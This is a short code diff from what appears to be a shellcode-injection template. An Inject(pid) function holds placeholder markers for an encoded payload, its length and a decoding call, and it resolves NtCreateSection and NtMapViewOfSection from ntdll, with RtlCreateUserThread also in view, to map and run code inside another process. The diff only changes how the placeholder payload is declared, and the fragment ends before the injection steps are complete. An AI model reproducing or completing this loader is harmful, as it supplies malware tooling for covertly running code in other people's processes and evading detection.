@@ -20,15 +20,12 @@ using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECU
 
 int Inject(int pid)
 {
-	const unsigned char raw[] = ####SHELLCODE####;
-	int length = sizeof(raw);
+    int length = ####SHELLCODE_LENGTH####;
+    unsigned char* encoded = ####SHELLCODE####;
 
-	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
-	memcpy(encoded, raw, length);
+    //####CALL####
 
-	//####CALL####
-
-	unsigned char* decoded = encoded;
+    unsigned char* decoded = encoded;
 
 	myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
 	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
